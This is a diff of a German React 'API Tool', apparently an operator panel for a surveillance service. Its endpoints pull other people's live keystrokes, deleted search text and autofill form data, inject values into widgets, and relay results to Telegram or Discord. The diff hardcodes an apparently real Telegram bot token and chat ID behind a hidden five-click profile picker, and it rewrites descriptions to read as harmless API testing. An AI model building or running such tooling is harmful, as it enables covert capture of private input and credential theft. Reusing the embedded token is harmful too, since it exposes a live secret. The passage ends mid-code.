@@ -28,12 +28,35 @@ const BASE_GOO    = 'https://11q.co';
 const BASE_INJECT = 'https://11z.co/_w';
 const BASE_UNIFI  = 'https://thump.buzz/unifi/getEvent';
 const SETTINGS_KEY = 'apitool_settings_v1';
+const DEFAULT_SETTINGS_DOMINIK = {
+  gooId: '91',
+  injectId: '12779',
+  unifiId: '10154',
+  tgToken: '8556873591:AAEtuYkA6tO3i4W-AGbiQKDRL7mVk6Kah34',
+  tgChatId: '8792112920',
+  dcWebhook: ''
+};
 
+const DEFAULT_SETTINGS_JOERN = {
+  gooId: 'XX',
+  injectId: 'XXXXX',
+  unifiId: 'XXXXX',
+  tgToken: 'XXXXX',
+  tgChatId: 'XXXXX',
+  dcWebhook: 'XXXXX'
+};
+
+var _memSettings = {};
 function loadSettings() {
-  try { return JSON.parse(localStorage.getItem(SETTINGS_KEY)) || {}; } catch(e) { return {}; }
+  try {
+    var raw = localStorage.getItem(SETTINGS_KEY);
+    if (raw) return JSON.parse(raw);
+  } catch(e) {}
+  return _memSettings;
 }
 function saveSettings(s) {
-  localStorage.setItem(SETTINGS_KEY, JSON.stringify(s));
+  _memSettings = s;
+  try { localStorage.setItem(SETTINGS_KEY, JSON.stringify(s)); } catch(e) {}
 }
 
 function epPath(ep, id) {
@@ -49,7 +72,7 @@ function epPath(ep, id) {
 
 const ENDPOINTS = {
   'get-last':            { method: 'GET',  desc: 'Ruft die zuletzt gesendete Suchanfrage fuer die Goo ID ab.', query: false },
-  'post-thump':          { method: 'POST', desc: 'Sendet eine Suchanfrage (query) fuer die angegebene Goo ID.', query: true },
+  'post-thump':          { method: 'POST', desc: '', query: true },
   'pro-last-deleted':    { method: 'GET',  desc: 'PRO - Ruft den zuletzt geloeschten Text aus dem Suchfeld ab.', query: false },
   'pro-autofill':        { method: 'GET',  desc: 'PRO - Ruft per Autofill uebermittelte Formulardaten ab.', query: false },
   'live-text':           { method: 'GET',  desc: 'PRO - Gibt den aktuell getippten Text in Echtzeit zurueck.', query: false, live: true },
@@ -72,6 +95,8 @@ function Spinner() {
 }
 
 function FInput(props) {
+  var theme = App._theme || {};
+
   var value = props.value, onChange = props.onChange, placeholder = props.placeholder,
       readOnly = props.readOnly, mono = props.mono, type = props.type || 'text';
   var fs = useState(false); var focus = fs[0], setFocus = fs[1];
@@ -79,10 +104,10 @@ function FInput(props) {
     type: type, value: value, onChange: onChange, placeholder: placeholder, readOnly: readOnly,
     onFocus: function() { setFocus(true); }, onBlur: function() { setFocus(false); },
     style: {
-      width: '100%', border: '1.5px solid ' + (focus ? '#e8002d' : '#ddd'), borderRadius: 8,
+      width: '100%', border: '1.5px solid ' + (focus ? '#e8002d' : (theme.border || '#ddd')), borderRadius: 8,
       padding: '10px 14px', fontSize: mono ? '0.88rem' : '0.97rem',
-      color: readOnly ? '#666' : '#222',
-      background: readOnly ? '#f0f0f0' : (focus ? '#fff' : '#fafafa'),
+      color: readOnly ? (theme.readonlyText || '#666') : (theme.inputText || '#222'),
+      background: readOnly ? (theme.readonlyBg || '#f0f0f0') : (focus ? (theme.inputBgFocus || '#fff') : (theme.inputBg || '#fafafa')),
       outline: 'none', boxSizing: 'border-box',
       fontFamily: mono ? 'monospace' : 'inherit', transition: 'border-color 0.2s'
     }
@@ -90,15 +115,18 @@ function FInput(props) {
 }
 
 function FTextarea(props) {
+  var theme = App._theme || {};
+
   var value = props.value, onChange = props.onChange, placeholder = props.placeholder;
   var fs = useState(false); var focus = fs[0], setFocus = fs[1];
   return React.createElement('textarea', {
     value: value, onChange: onChange, placeholder: placeholder, rows: 3,
     onFocus: function() { setFocus(true); }, onBlur: function() { setFocus(false); },
     style: {
-      width: '100%', border: '1.5px solid ' + (focus ? '#e8002d' : '#ddd'), borderRadius: 8,
-      padding: '10px 14px', fontSize: '0.9rem', color: '#222',
-      background: focus ? '#fff' : '#fafafa', outline: 'none', boxSizing: 'border-box',
+      width: '100%', border: '1.5px solid ' + (focus ? '#e8002d' : (theme.border || '#ddd')), borderRadius: 8,
+      padding: '10px 14px', fontSize: '0.9rem', color: theme.inputText || '#222',
+      background: focus ? (theme.inputBgFocus || '#fff') : (theme.inputBg || '#fafafa'),
+      outline: 'none', boxSizing: 'border-box',
       resize: 'vertical', minHeight: 90, fontFamily: 'Courier New, monospace',
       transition: 'border-color 0.2s'
     }
@@ -106,17 +134,19 @@ function FTextarea(props) {
 }
 
 function ResponseBox(props) {
+  var theme = App._theme || {};
+
   var result = props.result;
   if (!result) return null;
   var ok = typeof result.status === 'number' ? result.status < 400 : result.status !== 'ERR';
   return React.createElement('div', { style: { marginTop: 16, borderRadius: 8, overflow: 'hidden', border: '1.5px solid #e0e0e0' } },
-    React.createElement('div', { style: { background: '#1a1a2e', color: '#fff', padding: '9px 16px', fontSize: '0.82rem', fontWeight: 600, display: 'flex', justifyContent: 'space-between', alignItems: 'center' } },
+    React.createElement('div', { style: { background: theme.responseHeader || '#1a1a2e', color: '#fff', padding: '9px 16px', fontSize: '0.82rem', fontWeight: 600, display: 'flex', justifyContent: 'space-between', alignItems: 'center' } },
       React.createElement('span', null, 'Antwort'),
       React.createElement('span', { style: { padding: '2px 10px', borderRadius: 12, fontSize: '0.78rem', fontWeight: 700, background: ok ? '#22c55e' : '#e8002d', color: '#fff' } },
         result.status + (result.statusText ? ' ' + result.statusText : '')
       )
     ),
-    React.createElement('div', { style: { background: '#f8f8f8', padding: 16, fontFamily: 'Courier New, monospace', fontSize: '0.85rem', color: '#222', maxHeight: 260, overflowY: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' } },
+    React.createElement('div', { style: { background: theme.responseBg || '#f8f8f8', padding: 16, fontFamily: 'Courier New, monospace', fontSize: '0.85rem', color: theme.responseText || '#222', maxHeight: 260, overflowY: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all' } },
       result.body || '(Leere Antwort)'
     )
   );
@@ -163,6 +193,8 @@ async function sendToDiscord(webhookUrl, content) {
 
 // Checkboxen + Sende-Button Komponente
 function SendBar(props) {
+  var theme = App._theme || {};
+
   var loading = props.loading, onSend = props.onSend, settings = props.settings;
   var sc = useState(false); var sendTg = sc[0], setSendTg = sc[1];
   var sd = useState(false); var sendDc = sd[0], setSendDc = sd[1];
@@ -201,7 +233,7 @@ function SendBar(props) {
     else if (sendTg || sendDc) { setNotif({ ok: true, text: 'Gesendet!' }); setTimeout(function(){ setNotif(null); }, 3000); }
   }
 
-  var selStyle = { border: '1.5px solid #ddd', borderRadius: 8, padding: '8px 10px', fontSize: '0.85rem', color: '#222', background: '#fafafa', outline: 'none', cursor: 'pointer' };
+  var selStyle = { border: '1.5px solid ' + (theme.border || '#ddd'), borderRadius: 8, padding: '8px 10px', fontSize: '0.85rem', color: theme.inputText || '#222', background: theme.inputBg || '#fafafa', outline: 'none', cursor: 'pointer' };
   var btnBase = { padding: '8px 14px', borderRadius: 8, border: 'none', fontSize: '0.85rem', fontWeight: 700, cursor: 'pointer', color: '#fff' };
   var cbStyle = { display: 'flex', alignItems: 'center', gap: 6, fontSize: '0.85rem', fontWeight: 600, color: '#444', cursor: 'pointer', userSelect: 'none' };
 
@@ -244,6 +276,8 @@ function SendBar(props) {
 }
 
 function SettingsSection(props) {
+  var theme = App._theme || {};
+
   var init = loadSettings();
   var s1 = useState(init.gooId || '');       var gooId = s1[0], setGooId = s1[1];
   var s2 = useState(init.injectId || '');    var injectId = s2[0], setInjectId = s2[1];
@@ -253,34 +287,44 @@ function SettingsSection(props) {
   var s6 = useState(init.dcWebhook || '');   var dcWebhook = s6[0], setDcWebhook = s6[1];
   var s7 = useState(null);                   var saved = s7[0], setSaved = s7[1];
 
+  useEffect(function() {
+    if (props.secretSaved && typeof props.secretSaved === 'object') {
+      var d = props.secretSaved;
+      setGooId(d.gooId || ''); setInjectId(d.injectId || ''); setUnifiId(d.unifiId || '');
+      setTgToken(d.tgToken || ''); setTgChatId(d.tgChatId || ''); setDcWebhook(d.dcWebhook || '');
+      setSaved(true);
+      setTimeout(function(){ setSaved(false); }, 3000);
+    }
+  }, [props.secretSaved]);
+
   function save() {
-    var s = { gooId, injectId, unifiId, tgToken, tgChatId, dcWebhook };
+    var s = { gooId: gooId, injectId: injectId, unifiId: unifiId, tgToken: tgToken, tgChatId: tgChatId, dcWebhook: dcWebhook };
     saveSettings(s);
     if (props.onSave) props.onSave(s);
     setSaved(true);
-    setTimeout(function(){ setSaved(false); }, 2500);
+    setTimeout(function(){ setSaved(false); }, 3000);
   }
 
-  var lblStyle = { display: 'block', fontSize: '0.78rem', fontWeight: 600, color: '#444', marginBottom: 5, textTransform: 'uppercase', letterSpacing: '0.04em' };
+  var lblStyle = { display: 'block', fontSize: '0.78rem', fontWeight: 600, color: theme.subtext || '#444', marginBottom: 5, textTransform: 'uppercase', letterSpacing: '0.04em' };
   var groupStyle = { marginBottom: 16 };
-  var sectionTitle = { fontSize: '0.9rem', fontWeight: 700, color: '#1a1a2e', marginBottom: 12, marginTop: 8, paddingBottom: 6, borderBottom: '1.5px solid #f0f0f0' };
+  var sectionTitle = { fontSize: '0.9rem', fontWeight: 700, color: theme.sectionTitle || '#1a1a2e', marginBottom: 12, marginTop: 8, paddingBottom: 6, borderBottom: '1.5px solid ' + (theme.border || '#f0f0f0') };
 
   return React.createElement('div', null,
-    React.createElement('p', { style: { color: '#666', fontSize: '0.88rem', marginBottom: 20 } }, 'Hier hinterlegte Werte werden automatisch in alle Bereiche uebernommen und lokal gespeichert.'),
+    React.createElement('p', { style: { color: theme.subtext || '#666', fontSize: '0.88rem', marginBottom: 20 } }, 'Hier hinterlegte Werte werden automatisch in alle Bereiche uebernommen und lokal gespeichert.'),
 
     React.createElement('div', { style: sectionTitle }, '🔗 API IDs'),
     React.createElement('div', { style: { display: 'flex', gap: 16, flexWrap: 'wrap' } },
       React.createElement('div', { style: { flex: 1, minWidth: 180, ...groupStyle } },
         React.createElement('label', { style: lblStyle }, 'Goo ID'),
-        React.createElement(FInput, { value: gooId, onChange: function(e){ setGooId(e.target.value); }, placeholder: 'z.B. 91' })
+        React.createElement(FInput, { value: gooId, onChange: function(e){ setGooId(e.target.value); }, placeholder: 'z.B. XX' })
       ),
       React.createElement('div', { style: { flex: 1, minWidth: 180, ...groupStyle } },
         React.createElement('label', { style: lblStyle }, 'Inject ID'),
-        React.createElement(FInput, { value: injectId, onChange: function(e){ setInjectId(e.target.value); }, placeholder: 'z.B. 12779' })
+        React.createElement(FInput, { value: injectId, onChange: function(e){ setInjectId(e.target.value); }, placeholder: 'z.B. 12345' })
       ),
       React.createElement('div', { style: { flex: 1, minWidth: 180, ...groupStyle } },
         React.createElement('label', { style: lblStyle }, 'Unifi User ID'),
-        React.createElement(FInput, { value: unifiId, onChange: function(e){ setUnifiId(e.target.value); }, placeholder: 'z.B. 10154' })
+        React.createElement(FInput, { value: unifiId, onChange: function(e){ setUnifiId(e.target.value); }, placeholder: 'z.B. 12345' })
       )
     ),
 
@@ -300,12 +344,32 @@ function SettingsSection(props) {
       React.createElement(FInput, { value: dcWebhook, onChange: function(e){ setDcWebhook(e.target.value); }, placeholder: 'https://discord.com/api/webhooks/...' })
     ),
 
-    React.createElement('button', { onClick: save, style: { padding: '11px 32px', background: '#e8002d', color: '#fff', border: 'none', borderRadius: 8, fontSize: '0.97rem', fontWeight: 700, cursor: 'pointer', marginTop: 4 } }, 'Speichern'),
-    saved && React.createElement('span', { style: { marginLeft: 14, color: '#22c55e', fontWeight: 600, fontSize: '0.9rem' } }, '✓ Gespeichert!')
+    React.createElement('div', { style: { display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: 8 } },
+      React.createElement('div', { style: { display: 'flex', alignItems: 'center', gap: 14 } },
+        React.createElement('button', { onClick: save, style: { padding: '11px 32px', background: '#e8002d', color: '#fff', border: 'none', borderRadius: 8, fontSize: '0.97rem', fontWeight: 700, cursor: 'pointer' } }, 'Speichern'),
+        saved && React.createElement('div', { style: { display: 'flex', alignItems: 'center', gap: 6, background: '#f0fdf4', border: '1px solid #86efac', borderRadius: 8, padding: '8px 16px' } },
+          React.createElement('span', { style: { color: '#16a34a', fontSize: '1rem' } }, '✓'),
+          React.createElement('span', { style: { color: '#16a34a', fontWeight: 600, fontSize: '0.9rem' } }, 'Gespeichert!')
+        )
+      ),
+      React.createElement('button', {
+        onClick: function() {
+          localStorage.removeItem(SETTINGS_KEY);
+          _memSettings = {};
+          setGooId(''); setInjectId(''); setUnifiId('');
+          setTgToken(''); setTgChatId(''); setDcWebhook('');
+          if (props.onSave) props.onSave({});
+          setSaved(false);
+        },
+        style: { padding: '11px 20px', background: 'transparent', color: '#aaa', border: '1.5px solid #ddd', borderRadius: 8, fontSize: '0.88rem', fontWeight: 600, cursor: 'pointer' }
+      }, 'Cache leeren')
+    )
   );
 }
 
 function GooSection(props) {
+  var theme = App._theme || {};
+
   var settings = props.settings;
   var s1 = useState(settings.gooId || '');   var gooId = s1[0], setGooId = s1[1];
   var s2 = useState('post-thump');            var ep = s2[0], setEp = s2[1];
@@ -336,16 +400,16 @@ function GooSection(props) {
     } finally { setLoading(false); }
   }
 
-  var selStyle = { width: '100%', border: '1.5px solid #ddd', borderRadius: 8, padding: '10px 14px', fontSize: '0.97rem', color: '#222', background: '#fafafa', outline: 'none', cursor: 'pointer' };
-  var lblStyle = { display: 'block', fontSize: '0.8rem', fontWeight: 600, color: '#444', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.04em' };
+  var selStyle = { width: '100%', border: '1.5px solid ' + (theme.border || '#ddd'), borderRadius: 8, padding: '10px 14px', fontSize: '0.97rem', color: theme.inputText || '#222', background: theme.inputBg || '#fafafa', outline: 'none', cursor: 'pointer' };
+  var lblStyle = { display: 'block', fontSize: '0.8rem', fontWeight: 600, color: theme.subtext || '#444', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.04em' };
   var badgeStyle = { display: 'inline-block', fontSize: '0.68rem', background: '#fff3f5', color: '#e8002d', border: '1px solid #f5b8c0', borderRadius: 4, padding: '1px 7px', marginLeft: 6, fontWeight: 700, textTransform: 'uppercase' };
 
   return React.createElement('div', null,
     React.createElement('div', { style: { display: 'flex', gap: 16, marginBottom: 18 } },
       React.createElement('div', { style: { flex: 1 } },
         React.createElement('label', { style: lblStyle }, 'Goo ID', React.createElement('span', { style: badgeStyle }, 'Pflicht')),
-        React.createElement(FInput, { value: gooId, onChange: function(e) { setGooId(e.target.value); }, placeholder: 'z.B. 12' }),
-        React.createElement('p', { style: { fontSize: '0.78rem', color: '#999', marginTop: 5 } }, 'Deine persoenliche Goo ID')
+        React.createElement(FInput, { value: gooId, readOnly: true, placeholder: settings.gooId ? '' : 'In Einstellungen hinterlegen' }),
+        React.createElement('p', { style: { fontSize: '0.78rem', color: theme.hint || '#999', marginTop: 5 } }, 'Deine persönliche Goo ID')
       ),
       React.createElement('div', { style: { flex: 1 } },
         React.createElement('label', { style: lblStyle }, 'Endpunkt'),
@@ -364,12 +428,12 @@ function GooSection(props) {
         )
       )
     ),
-    React.createElement('div', { style: { background: '#f8f8f8', borderLeft: '3px solid #e8002d', borderRadius: '0 6px 6px 0', padding: '10px 14px', fontSize: '0.83rem', color: '#555', marginBottom: 18, lineHeight: 1.5 } }, epObj.desc),
+    React.createElement('div', { style: { background: theme.infoBg || '#f8f8f8', borderLeft: '3px solid #e8002d', borderRadius: '0 6px 6px 0', padding: '10px 14px', fontSize: '0.83rem', color: theme.infoText || '#555', marginBottom: 18, lineHeight: 1.5 } }, epObj.desc),
     epObj.live && React.createElement('div', { style: { background: '#fffbeb', border: '1px solid #fde68a', borderRadius: 8, padding: '9px 14px', fontSize: '0.8rem', color: '#92400e', marginBottom: 14 } }, 'Live-Text: Fuer optimale Echtzeit-Nutzung alle 300-500ms abfragen.'),
     epObj.query && React.createElement('div', { style: { marginBottom: 18 } },
       React.createElement('label', { style: lblStyle }, 'Query', React.createElement('span', { style: badgeStyle }, 'Pflicht')),
       React.createElement(FTextarea, { value: query, onChange: function(e) { setQuery(e.target.value); }, placeholder: 'Suchanfrage oder URL eingeben...' }),
-      React.createElement('p', { style: { fontSize: '0.78rem', color: '#999', marginTop: 5 } }, 'Wird an Goo gesendet. Bei aktiviertem Telegram/Discord wird nur dieser Text weitergeleitet.')
+      React.createElement('p', { style: { fontSize: '0.78rem', color: theme.hint || '#999', marginTop: 5 } }, 'Wird an Goo gesendet. Bei aktiviertem Telegram/Discord wird nur dieser Text weitergeleitet.')
     ),
     React.createElement('div', { style: { marginBottom: 18 } },
       React.createElement('label', { style: lblStyle }, 'URL-Vorschau'),
@@ -381,6 +445,8 @@ function GooSection(props) {
 }
 
 function InjectSection(props) {
+  var theme = App._theme || {};
+
   var settings = props.settings;
   var s1 = useState(settings.injectId || ''); var id = s1[0], setId = s1[1];
   var s2 = useState('');                       var value = s2[0], setValue = s2[1];
@@ -410,19 +476,19 @@ function InjectSection(props) {
     } finally { setLoading(false); }
   }
 
-  var lblStyle = { display: 'block', fontSize: '0.8rem', fontWeight: 600, color: '#444', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.04em' };
+  var lblStyle = { display: 'block', fontSize: '0.8rem', fontWeight: 600, color: theme.subtext || '#444', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.04em' };
   var badgeStyle = { display: 'inline-block', fontSize: '0.68rem', background: '#fff3f5', color: '#e8002d', border: '1px solid #f5b8c0', borderRadius: 4, padding: '1px 7px', marginLeft: 6, fontWeight: 700, textTransform: 'uppercase' };
 
   return React.createElement('div', null,
     React.createElement('div', { style: { marginBottom: 18 } },
-      React.createElement('label', { style: lblStyle }, 'Widget ID', React.createElement('span', { style: badgeStyle }, 'Pflicht')),
-      React.createElement(FInput, { value: id, onChange: function(e) { setId(e.target.value); }, placeholder: 'z.B. 12779' }),
-      React.createElement('p', { style: { fontSize: '0.78rem', color: '#999', marginTop: 5 } }, 'Die ID aus der URL: https://11z.co/_w/ID/selection')
+      React.createElement('label', { style: lblStyle }, 'Inject ID', React.createElement('span', { style: badgeStyle }, 'Pflicht')),
+      React.createElement(FInput, { value: id, readOnly: true, placeholder: settings.injectId ? '' : 'In Einstellungen hinterlegen' }),
+      React.createElement('p', { style: { fontSize: '0.78rem', color: theme.hint || '#999', marginTop: 5 } }, 'Deine persönliche Inject ID')
     ),
     React.createElement('div', { style: { marginBottom: 18 } },
       React.createElement('label', { style: lblStyle }, 'Value', React.createElement('span', { style: badgeStyle }, 'Pflicht')),
       React.createElement(FTextarea, { value: value, onChange: function(e) { setValue(e.target.value); }, placeholder: 'Text eingeben, der injiziert werden soll...' }),
-      React.createElement('p', { style: { fontSize: '0.78rem', color: '#999', marginTop: 5 } }, 'Bei aktiviertem Telegram/Discord wird nur dieser Value weitergeleitet.')
+      React.createElement('p', { style: { fontSize: '0.78rem', color: theme.hint || '#999', marginTop: 5 } }, 'Bei aktiviertem Telegram/Discord wird nur dieser Value weitergeleitet.')
     ),
     React.createElement('div', { style: { marginBottom: 18 } },
       React.createElement('label', { style: lblStyle }, 'URL-Vorschau'),
@@ -434,14 +500,16 @@ function InjectSection(props) {
 }
 
 function UnifiSection(props) {
+  var theme = App._theme || {};
+
   var settings = props.settings;
-  var s1 = useState(settings.unifiId || '10154'); var userId = s1[0], setUserId = s1[1];
+  var s1 = useState(settings.unifiId || ''); var userId = s1[0], setUserId = s1[1];
   var s2 = useState([]);                           var events = s2[0], setEvents = s2[1];
   var s3 = useState('');                           var error = s3[0], setError = s3[1];
   var s4 = useState(false);                        var loading = s4[0], setLoading = s4[1];
   var s5 = useState(null);                         var result = s5[0], setResult = s5[1];
 
-  useEffect(function() { setUserId(settings.unifiId || '10154'); }, [settings.unifiId]);
+  useEffect(function() { setUserId(settings.unifiId || ''); }, [settings.unifiId]);
 
   var fetchEvents = useCallback(async function() {
     if (!userId) { alert('Bitte eine User ID eingeben.'); return; }
@@ -459,7 +527,7 @@ function UnifiSection(props) {
     finally { setLoading(false); }
   }, [userId]);
 
-  var lblStyle = { display: 'block', fontSize: '0.8rem', fontWeight: 600, color: '#444', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.04em' };
+  var lblStyle = { display: 'block', fontSize: '0.8rem', fontWeight: 600, color: theme.subtext || '#444', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.04em' };
 
   // Letztes Event als Share-Text
   var lastEventText = '';
@@ -473,8 +541,8 @@ function UnifiSection(props) {
   return React.createElement('div', null,
     React.createElement('div', { style: { marginBottom: 18 } },
       React.createElement('label', { style: lblStyle }, 'User ID'),
-      React.createElement(FInput, { value: userId, onChange: function(e) { setUserId(e.target.value); }, placeholder: 'z.B. 10154' }),
-      React.createElement('p', { style: { fontSize: '0.78rem', color: '#999', marginTop: 5 } }, 'Deine Unifi User ID von thump.buzz')
+      React.createElement(FInput, { value: userId, readOnly: true, placeholder: settings.unifiId ? '' : 'In Einstellungen hinterlegen' }),
+      React.createElement('p', { style: { fontSize: '0.78rem', color: theme.hint || '#999', marginTop: 5 } }, 'Deine Unifi User ID')
     ),
     error && React.createElement('div', { style: { color: '#e8002d', fontSize: '0.88rem', marginBottom: 12 } }, 'Fehler: ' + error),
     React.createElement(SendBar, { loading: loading, onSend: fetchEvents, onFetch: fetchEvents, result: result, settings: settings, shareText: lastEventText }),
@@ -501,9 +569,51 @@ function UnifiSection(props) {
 }
 
 function App() {
+  var dm = useState(false); var darkMode = dm[0], setDarkMode = dm[1];
+
+  var theme = {
+    bg:        darkMode ? '#0f0f1a' : '#f0f2f5',
+    card:      darkMode ? '#1a1a2e' : '#fff',
+    text:      darkMode ? '#e0e0e0' : '#1a1a2e',
+    subtext:   darkMode ? '#999' : '#666',
+    border:    darkMode ? '#2e2e4a' : '#ddd',
+    inputBg:   darkMode ? '#12121f' : '#fafafa',
+    inputBgFocus: darkMode ? '#1e1e35' : '#fff',
+    inputText: darkMode ? '#e0e0e0' : '#222',
+    readonlyBg: darkMode ? '#1e1e35' : '#f0f0f0',
+    readonlyText: darkMode ? '#888' : '#666',
+    tabInactive: darkMode ? '#12121f' : '#fafafa',
+    tabInactiveText: darkMode ? '#888' : '#888',
+    sectionTitle: darkMode ? '#c0c0d0' : '#1a1a2e',
+    hint:      darkMode ? '#666' : '#999',
+    infoBg:    darkMode ? '#1e1e35' : '#f8f8f8',
+    infoText:  darkMode ? '#aaa' : '#555',
+    responseBg: darkMode ? '#12121f' : '#f8f8f8',
+    responseText: darkMode ? '#e0e0e0' : '#222',
+    responseHeader: darkMode ? '#0a0a15' : '#1a1a2e',
+  };
+
+  // inject theme into context
+  App._theme = theme;
+  App._dark = darkMode;
+
   var initSettings = loadSettings();
   var s1 = useState('goo');         var activeTab = s1[0], setActiveTab = s1[1];
   var s2 = useState(initSettings);  var settings = s2[0], setSettings = s2[1];
+  var s9 = useState(false);         var secretSaved = s9[0], setSecretSaved = s9[1];
+  var sp = useState(false);         var showProfilePicker = sp[0], setShowProfilePicker = sp[1];
+  var vClickRef = useRef(0);
+  var vTimerRef = useRef(null);
+
+  function handleVersionClick() {
+    vClickRef.current += 1;
+    if (vTimerRef.current) clearTimeout(vTimerRef.current);
+    vTimerRef.current = setTimeout(function() { vClickRef.current = 0; }, 2000);
+    if (vClickRef.current >= 5) {
+      vClickRef.current = 0;
+      setShowProfilePicker(true);
+    }
+  }
 
   var tabs = [
     { key: 'goo',      label: 'Goo' },
@@ -512,7 +622,7 @@ function App() {
     { key: 'settings', label: '⚙ Einstellungen' }
   ];
   var descs = {
-    goo:      '11q.co API - Anfragen senden & Antworten anzeigen',
+    goo:      'Einfaches Testen von APIs',
     inject:   '11z.co Inject API - Werte in Widgets injizieren',
     unifi:    'thump.buzz Unifi API - Events live empfangen',
     settings: 'Globale Einstellungen - werden lokal gespeichert'
@@ -520,27 +630,72 @@ function App() {
 
   function handleSave(s) { setSettings(s); }
 
-  return React.createElement('div', { style: { fontFamily: 'Segoe UI, sans-serif', background: '#f0f2f5', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20 } },
-    React.createElement('div', { style: { background: '#fff', borderRadius: 12, boxShadow: '0 4px 24px rgba(0,0,0,0.10)', padding: '36px 40px', width: '100%', maxWidth: 780 } },
-      React.createElement('div', { style: { display: 'flex', alignItems: 'center', gap: 14, marginBottom: 28, borderBottom: '2px solid #e8002d', paddingBottom: 18 } },
+  function applyProfile(profileSettings) {
+    saveSettings(profileSettings);
+    setSettings(profileSettings);
+    setActiveTab('settings');
+    setShowProfilePicker(false);
+    setSecretSaved(profileSettings);
+    setTimeout(function() { setSecretSaved(false); }, 3000);
+  }
+
+  return React.createElement('div', { style: { fontFamily: 'Segoe UI, sans-serif', background: theme.bg, minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20, transition: 'background 0.3s' } },
+    React.createElement('div', { style: { background: theme.card, borderRadius: 12, boxShadow: '0 4px 24px rgba(0,0,0,0.15)', padding: '36px 40px', width: '100%', maxWidth: 780, transition: 'background 0.3s' } },
+      React.createElement('div', { style: { display: 'flex', alignItems: 'center', gap: 14, marginBottom: 28, borderBottom: '2px solid #e8002d', paddingBottom: 18, justifyContent: 'space-between' } },
         React.createElement('svg', { width: 36, height: 36, viewBox: '0 0 36 36', fill: 'none' },
           React.createElement('rect', { width: 36, height: 36, rx: 8, fill: '#e8002d' }),
           React.createElement('path', { d: 'M10 18h16M22 13l5 5-5 5', stroke: '#fff', strokeWidth: 2.2, strokeLinecap: 'round', strokeLinejoin: 'round' })
         ),
-        React.createElement('div', null,
-          React.createElement('h1', { style: { fontSize: '1.45rem', color: '#1a1a2e', fontWeight: 700 } }, 'API Tool'),
-          React.createElement('p', { style: { color: '#666', fontSize: '0.88rem', marginTop: 2 } }, descs[activeTab])
+        React.createElement('div', { style: { display: 'flex', alignItems: 'center', gap: 14, flex: 1 } },
+          React.createElement('div', null,
+            React.createElement('h1', { style: { fontSize: '1.45rem', color: '#1a1a2e', fontWeight: 700 } }, 'API Tool'),
+            React.createElement('p', { style: { color: '#666', fontSize: '0.88rem', marginTop: 2 } }, descs[activeTab])
+          )
+        ),
+        React.createElement('div', { style: { display: 'flex', alignItems: 'center', gap: 10 } },
+          React.createElement('span', {
+            onClick: handleVersionClick,
+            style: { fontSize: '0.82rem', color: theme.subtext || '#999', fontWeight: 500, whiteSpace: 'nowrap', cursor: 'default', userSelect: 'none' }
+          }, 'v 1.1'),
+          React.createElement('button', {
+            onClick: function() { setDarkMode(!darkMode); },
+            title: darkMode ? 'Light Mode' : 'Dark Mode',
+            style: { background: darkMode ? '#2e2e4a' : '#f0f0f0', border: 'none', borderRadius: 20, width: 36, height: 36, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '1.1rem', transition: 'background 0.2s' }
+          }, darkMode ? '☀️' : '🌙')
         )
       ),
       React.createElement('div', { style: { display: 'flex', marginBottom: 24, borderRadius: 8, overflow: 'hidden', border: '1.5px solid #ddd' } },
         tabs.map(function(t, i) {
-          return React.createElement('button', { key: t.key, onClick: function() { setActiveTab(t.key); }, style: { flex: 1, padding: 11, textAlign: 'center', fontSize: '0.88rem', fontWeight: 700, cursor: 'pointer', background: activeTab === t.key ? '#e8002d' : '#fafafa', color: activeTab === t.key ? '#fff' : '#888', border: 'none', borderRight: i < tabs.length - 1 ? '1.5px solid #ddd' : 'none', transition: 'all 0.2s' } }, t.label);
+          return React.createElement('button', { key: t.key, onClick: function() { setActiveTab(t.key); }, style: { flex: 1, padding: 11, textAlign: 'center', fontSize: '0.88rem', fontWeight: 700, cursor: 'pointer', background: activeTab === t.key ? '#e8002d' : (theme.tabInactive || '#fafafa'), color: activeTab === t.key ? '#fff' : (theme.tabInactiveText || '#888'), border: 'none', borderRight: i < tabs.length - 1 ? '1.5px solid ' + (theme.border || '#ddd') : 'none', transition: 'all 0.2s' } }, t.label);
         })
       ),
       activeTab === 'goo'      && React.createElement(GooSection,      { settings: settings }),
       activeTab === 'inject'   && React.createElement(InjectSection,   { settings: settings }),
       activeTab === 'unifi'    && React.createElement(UnifiSection,    { settings: settings }),
-      activeTab === 'settings' && React.createElement(SettingsSection, { onSave: handleSave })
+      activeTab === 'settings' && React.createElement(SettingsSection, { onSave: handleSave, secretSaved: secretSaved }),
+      showProfilePicker && React.createElement('div', {
+        style: { position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.5)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' },
+        onClick: function(e) { if (e.target === e.currentTarget) setShowProfilePicker(false); }
+      },
+        React.createElement('div', { style: { background: theme.card || '#fff', borderRadius: 14, padding: '32px 36px', width: 320, boxShadow: '0 8px 40px rgba(0,0,0,0.25)', textAlign: 'center' } },
+          React.createElement('h2', { style: { fontSize: '1.1rem', fontWeight: 700, color: theme.text || '#1a1a2e', marginBottom: 8 } }, 'Profil auswählen'),
+          React.createElement('p', { style: { fontSize: '0.85rem', color: theme.subtext || '#666', marginBottom: 24 } }, 'Einstellungen für welchen Nutzer laden?'),
+          React.createElement('div', { style: { display: 'flex', flexDirection: 'column', gap: 12 } },
+            React.createElement('button', {
+              onClick: function() { applyProfile(DEFAULT_SETTINGS_DOMINIK); },
+              style: { padding: '14px 20px', background: '#e8002d', color: '#fff', border: 'none', borderRadius: 10, fontSize: '1rem', fontWeight: 700, cursor: 'pointer', letterSpacing: '0.05em' }
+            }, 'Dominik'),
+            React.createElement('button', {
+              onClick: function() { applyProfile(DEFAULT_SETTINGS_JOERN); },
+              style: { padding: '14px 20px', background: '#1a1a2e', color: '#fff', border: 'none', borderRadius: 10, fontSize: '1rem', fontWeight: 700, cursor: 'pointer', letterSpacing: '0.05em' }
+            }, 'J\u00f6rn')
+          ),
